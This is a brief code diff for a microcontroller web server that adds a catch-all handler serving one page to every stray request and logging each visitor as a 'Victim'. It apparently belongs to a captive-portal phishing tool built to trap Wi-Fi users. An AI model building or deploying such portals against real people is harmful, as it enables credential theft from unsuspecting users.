@@ -66,6 +66,12 @@ void setupServer(){
       request->send_P(200, "text/html", index_html); 
       Serial.println("Client Connected");
   });
+  //handling strays
+  server.onNotFound([](AsyncWebServerRequest *request){
+    request->send_P(200, "text/html", index_html);
+    Serial.println("Victim Connected");
+    
+  });
 
   //recive and send information
   server.on("/get", HTTP_GET, [] (AsyncWebServerRequest *request) {
